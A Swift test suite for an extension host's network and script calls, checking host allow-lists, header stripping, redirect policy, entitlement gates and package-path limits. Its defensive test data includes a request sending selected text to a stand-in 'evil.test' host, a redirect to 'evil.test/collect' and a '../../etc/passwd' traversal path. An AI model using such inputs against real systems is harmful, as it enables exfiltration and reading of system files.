import Foundation
import PappuAnalysis
import PappuAX
import PappuCore
import PappuJSBridge
import PappuRuntime
import PappuSelection
import PappuTestSupport
import Synchronization
import Testing

/// Requests, as the fetcher would have made them: nothing here reaches the network.
private final class RecordingFetcher: HTTPFetching {
    private let asked = Mutex<[HTTPFetch]>([])
    private let answer: @Sendable (HTTPFetch) throws -> HTTPFetched

    init(_ answer: @escaping @Sendable (HTTPFetch) throws -> HTTPFetched = { HTTPFetched(status: 200, url: $0.url, body: Data("ok".utf8)) }) {
        self.answer = answer
    }

    var requests: [HTTPFetch] { asked.withLock { $0 } }

    func fetch(_ request: HTTPFetch, policy: NetworkPolicy) async throws -> HTTPFetched {
        asked.withLock { $0.append(request) }
        return try answer(request)
    }
}

/// The dispatcher with week 4's groups, over the real manager and fakes at the edges.
private struct CallScene {
    let manager: InvocationManager
    let fetcher: RecordingFetcher
    let scripts: FakeScripts
    let shortcuts: FakeShortcuts
    let effects: HostAPIDispatcher.Effects

    init(
        fetcher: RecordingFetcher = RecordingFetcher(),
        scripts: FakeScripts = FakeScripts(.returned("told")),
        shortcuts: FakeShortcuts = FakeShortcuts(.returned("made")),
        httpFetcher: (any HTTPFetching)? = nil
    ) {
        let clock = ManualTimeSource()
        let probe = FakeDestinationProbe(settled())
        let manager = InvocationManager(
            verifier: DestinationVerifier(
                gate: PrivacyGate(PrivacyRules()),
                probe: probe,
                policies: policies(),
                epochs: FakeInput(),
                frontmost: { editor },
                secureInputIsActive: { false },
                timing: .initial,
                now: clock.reader
            ),
            probe: probe,
            epochs: FakeInput(),
            timing: .initial,
            sleeper: FakeSleep(),
            now: clock.reader
        )
        let pasteboard = ScriptedPasteboard(text: "held")
        let broker = ClipboardBroker(
            pasteboard: pasteboard,
            input: pasteboard,
            copy: pasteboard,
            pasting: pasteboard,
            scheduling: pasteboard,
            timing: .initial
        )
        self.manager = manager
        self.fetcher = fetcher
        self.scripts = scripts
        self.shortcuts = shortcuts
        var effects = HostAPIDispatcher.Effects(
            manager: manager,
            mutator: TextMutator(clipboard: broker, manager: manager),
            editor: SelectionEditor(cut: pasteboard, paste: pasteboard, manager: manager),
            presser: KeyPresser(poster: FakeKeyPresses(), manager: manager, sleep: SteppingSleep()),
            clipboard: broker,
            urls: FakeURLOpener(),
            services: scripts,
            system: FakeHostServices()
        )
        effects.groups = [
            NetworkHostCalls(fetcher: httpFetcher ?? fetcher, manager: manager),
            ScriptHostCalls(manager: manager, appleScripts: scripts, shortcuts: shortcuts),
        ]
        self.effects = effects
    }

    /// A JavaScript action of an extension with these entitlements and hosts, as the catalog holds it.
    static func action(_ entitlements: [Entitlement], hosts: [String] = [], directory: URL? = nil) -> CatalogAction {
        let manifest = ExtensionManifest(
            name: "Fetch",
            identifier: "com.example.fetch",
            entitlements: entitlements,
            networkHosts: hosts,
            actions: [ActionManifest(identifier: "a", executor: .javaScript(JavaScriptAction(source: .inline("return 1"))))]
        )
        var action = ActionCatalog(entries: [.init(manifest: manifest, origin: .installed)]).actions[0]
        action.directory = directory
        return action
    }

    func dispatcher(_ action: CatalogAction, gates: Set<GatedCapability> = [.unboundedCode]) async -> HostAPIDispatcher {
        let invocation = await manager.begin(InvocationRequest(
            attempt: AttemptID(rawValue: 1),
            route: .automatic,
            target: editor,
            action: action.key.description,
            mayMutate: true,
            text: "selected",
            range: AXTextRange(location: 10, length: 5),
            strategy: .ax,
            owner: "owner"
        ))
        return HostAPIDispatcher(
            run: HostAPIDispatcher.Run(
                invocation: invocation,
                gates: gates,
                context: SelectionContext(
                    app: AppIdentity(pid: editor.pid, bundleID: editor.bundleID, name: "Editor"),
                    editability: Editability(isEditable: true, source: .settableSelectedText),
                    canCut: true,
                    canCopy: true,
                    canPaste: true
                ),
                target: editor,
                text: "selected",
                action: action
            ),
            effects: effects
        )
    }
}

private func call(_ method: String, _ arguments: String) -> JSHostCall {
    JSHostCall(invocation: 1, extensionName: "owner", method: method, arguments: arguments)
}

private func request(_ url: String, method: String = "GET", headers: [[String]] = [], body: String? = nil) -> JSHostCall {
    var object: [String: Any] = ["method": method, "url": url, "headers": headers]
    if let body { object["body"] = Data(body.utf8).base64EncodedString() }
    let data = try! JSONSerialization.data(withJSONObject: object)
    return call("httpRequest", String(decoding: data, as: UTF8.self))
}

private func decoded(_ answer: JSHostAnswer) -> [String: Any]? {
    guard case .value(let json) = answer else { return nil }
    return (try? JSONSerialization.jsonObject(with: Data(json.utf8))) as? [String: Any]
}

// MARK: httpRequest (JS-8, SEC-1c, SEC-6)

@Suite struct NetworkHostCallsTests {
    static let undeclared = JSHostAnswer.refused("httpRequest may only reach the hosts the extension declares in networkHosts.")

    /// SEC-6: a request to a host the extension did not declare fails, and nothing is sent.
    @Test func aRequestToAnUndeclaredHostFails() async {
        let scene = CallScene()
        let host = await scene.dispatcher(CallScene.action([.network], hosts: ["api.example.com"]))
        #expect(await host.perform(request("https://evil.test/?q=selected")) == Self.undeclared)
        #expect(await host.perform(request("https://example.com/")) == Self.undeclared)
        #expect(await host.perform(request("http://api.example.com/")) == .refused("httpRequest reaches a named host only over https."))
        #expect(scene.fetcher.requests.isEmpty)

        let answer = await host.perform(request("https://API.example.com/v1?q=selected"))
        #expect(decoded(answer)?["status"] as? Int == 200)
        #expect(decoded(answer)?["body"] as? String == Data("ok".utf8).base64EncodedString())
        #expect(scene.fetcher.requests.map(\.url.absoluteString) == ["https://API.example.com/v1?q=selected"])
    }

    /// Declared hosts need no grant; without them the `network` grant is needed, and then any host will do.
    @Test func withoutHostsTheNetworkGrantIsNeeded() async {
        let scene = CallScene()
        let hosts = await scene.dispatcher(CallScene.action([.network], hosts: ["api.example.com"]), gates: [])
        #expect(decoded(await hosts.perform(request("https://api.example.com/"))) != nil)

        let any = CallScene.action([.network])
        let ungranted = await scene.dispatcher(any)
        #expect(await ungranted.perform(request("https://elsewhere.test/")) == .refused("httpRequest needs the network permission, which this extension does not have."))
        let granted = await scene.dispatcher(any, gates: [.unboundedCode, .network])
        #expect(decoded(await granted.perform(request("https://elsewhere.test/"))) != nil)
        #expect(scene.fetcher.requests.map(\.url.host) == ["api.example.com", "elsewhere.test"])
    }

    /// SEC-1c: without the entitlement there is no network at all, whatever was granted.
    @Test func withoutTheEntitlementNothingIsSent() async {
        let scene = CallScene()
        let host = await scene.dispatcher(CallScene.action([]), gates: Set(GatedCapability.allCases))
        #expect(await host.perform(request("https://api.example.com/")) == .refused("httpRequest needs the network entitlement, which this extension does not have."))
        #expect(scene.fetcher.requests.isEmpty)
    }

    /// What is sent is what the script set, less what only the transport may set.
    @Test func theRequestIsWhatTheScriptSet() async throws {
        let scene = CallScene()
        let host = await scene.dispatcher(CallScene.action([.network], hosts: ["api.example.com"]))
        let headers = [["X-Key", "k"], ["Cookie", "a=b"], ["Host", "evil.test"], ["Proxy-Authorization", "x"], ["Sec-Fetch-Mode", "cors"]]
        _ = await host.perform(request("https://api.example.com/", method: "post", headers: headers, body: "hi"))
        let sent = try #require(scene.fetcher.requests.first)
        #expect(sent.method == "POST")
        #expect(sent.headers.map { [$0.name, $0.value] } == [["X-Key", "k"]])
        #expect(sent.body == Data("hi".utf8))
        #expect(await host.perform(request("https://api.example.com/", method: "CONNECT")) == .refused("httpRequest was not given a method it makes."))
        #expect(await host.perform(call("httpRequest", #"{"method":"GET"}"#)) == .refused("httpRequest was not given what it takes."))
    }

    @Test func aTimeoutAndAnUnreachableServerAreAnswers() async {
        let timedOut = CallScene(fetcher: RecordingFetcher { _ in throw HTTPFetchFailure.timedOut })
        let host = await timedOut.dispatcher(CallScene.action([.network], hosts: ["api.example.com"]))
        #expect(await host.perform(request("https://api.example.com/")) == .value(#"{"timedOut":true}"#))
        let unreachable = CallScene(fetcher: RecordingFetcher { _ in throw HTTPFetchFailure.unreachable })
        let other = await unreachable.dispatcher(CallScene.action([.network], hosts: ["api.example.com"]))
        #expect(await other.perform(request("https://api.example.com/")) == .failed("httpRequest could not reach the server."))
    }

    /// SEC-6: a redirect is asked the same question before it is followed; one to an undeclared host
    /// ends the request there.
    @Test func aRedirectOutsideThePolicyIsNotFollowed() async throws {
        StubServer.reset()
        let scene = CallScene(httpFetcher: URLSessionHTTPFetcher(protocolClasses: [StubServer.self]))
        let host = await scene.dispatcher(CallScene.action([.network], hosts: ["api.example.com"]))
        #expect(await host.perform(request("https://api.example.com/away")) == .refused("httpRequest was redirected to an address the extension may not reach."))
        #expect(StubServer.requested == ["https://api.example.com/away"])

        StubServer.reset()
        let answer = await host.perform(request("https://api.example.com/moved"))
        #expect(decoded(answer)?["status"] as? Int == 200)
        #expect(decoded(answer)?["url"] as? String == "https://api.example.com/here")
        #expect(StubServer.requested == ["https://api.example.com/moved", "https://api.example.com/here"])
    }
}

/// A server in place of the network: `/away` redirects off the declared host, `/moved` within it.
final class StubServer: URLProtocol {
    private static let log = Mutex<[String]>([])
    static var requested: [String] { log.withLock { $0 } }
    static func reset() { log.withLock { $0 = [] } }

    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let url = request.url else { return }
        Self.log.withLock { $0.append(url.absoluteString) }
        let redirects = ["/away": "https://evil.test/collect", "/moved": "https://api.example.com/here"]
        if let target = redirects[url.path], let to = URL(string: target) {
            let response = HTTPURLResponse(url: url, statusCode: 302, httpVersion: "HTTP/1.1", headerFields: ["Location": target])!
            client?.urlProtocol(self, wasRedirectedTo: URLRequest(url: to), redirectResponse: response)
            return
        }
        let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: "HTTP/1.1", headerFields: ["Content-Type": "text/plain"])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: Data("here".utf8))
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

// MARK: External scripts (JS-5)

@Suite struct ScriptHostCallsTests {
    /// SEC-7d: the grant alone is not enough; the extension must have declared the entitlement.
    @Test func aScriptNeedsTheGrantAndTheEntitlement() async {
        let scene = CallScene()
        let shell = call("runShellScript", #"{"script":"echo hi","interpreter":"/bin/sh","shellMode":"none"}"#)
        let ungranted = await scene.dispatcher(CallScene.action([.script]))
        #expect(await ungranted.perform(shell) == .refused("runShellScript needs the script permission, which this extension does not have."))
        #expect(await ungranted.perform(call("runShortcut", #"{"name":"Make"}"#)) == .refused("runShortcut needs the script permission, which this extension does not have."))
        let undeclared = await scene.dispatcher(CallScene.action([]), gates: [.unboundedCode, .script])
        #expect(await undeclared.perform(shell) == .refused("runShellScript needs the script entitlement, which this extension does not have."))
        #expect(scene.scripts.calls.isEmpty)
        #expect(scene.shortcuts.calls.isEmpty)
    }

    /// A shell script's own failure is an answer, with its status and both outputs.
    @Test func aShellScriptAnswersItsStatusAndOutput() async throws {
        let scene = CallScene()
        let host = await scene.dispatcher(CallScene.action([.script]), gates: [.unboundedCode, .script])
        let script = #"{"script":"read line; printf 'out %s' \"$line\"; printf 'err' >&2; exit 3","interpreter":"/bin/sh","shellMode":"none","stdin":"in\n"}"#
        let answer = try #require(decoded(await host.perform(call("runShellScript", script))))
        #expect(answer["status"] as? Int == 3)
        #expect(answer["stdout"] as? String == "out in")
        #expect(answer["stderr"] as? String == "err")
        #expect(answer["terminationReason"] as? String == "exit")
    }

    @Test func aFileOutsideThePackageIsRefused() async throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let scene = CallScene()
        let host = await scene.dispatcher(CallScene.action([.script], directory: folder), gates: [.unboundedCode, .script])
        #expect(await host.perform(call("runShellScript", #"{"file":"../../etc/passwd"}"#)) == .refused("runShellScriptFile was not given a file in the extension's package."))
    }

    @Test func appleScriptsAndShortcutsRunThroughTheirRunners() async {
        let scene = CallScene()
        let host = await scene.dispatcher(CallScene.action([.script]), gates: [.unboundedCode, .script])
        #expect(await host.perform(call("runAppleScript", #"{"source":"return 1","handler":"go","params":["a"]}"#)) == .value(#""told""#))
        #expect(scene.scripts.calls == [.appleScript(AppleScriptRunRequest(source: .text("return 1"), handler: "go", arguments: ["a"]))])
        #expect(await host.perform(call("runShortcut", #"{"name":"Make","input":"text"}"#)) == .value(#""made""#))
        #expect(scene.shortcuts.calls.map(\.name) == ["Make"])
        #expect(scene.shortcuts.calls.map(\.input) == ["text"])
    }
}
